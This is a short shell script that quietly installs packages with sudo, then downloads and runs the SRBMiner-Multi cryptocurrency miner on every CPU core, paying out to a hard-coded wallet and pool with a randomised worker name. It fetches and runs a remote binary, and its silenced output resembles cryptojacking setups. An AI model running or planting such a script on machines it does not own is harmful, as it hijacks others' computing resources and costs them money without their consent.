#!/bin/sh

WALLET=web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MiChat86-$(echo $(shuf -i 1-9999 -n 1))

POOL=stratum+tcps://stratum-eu.rplant.xyz:17017

sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz
tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz
cd SRBMiner-Multi-0-8-5; ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool $POOL --wallet $WALLET --password vapers86 --cpu-threads $(nproc) --msr-use-tweaks 0 --msr-use-preset 0 --cpu-threads-intensity 1 --cpu-threads-priority 3 -randomx-1gb-pages
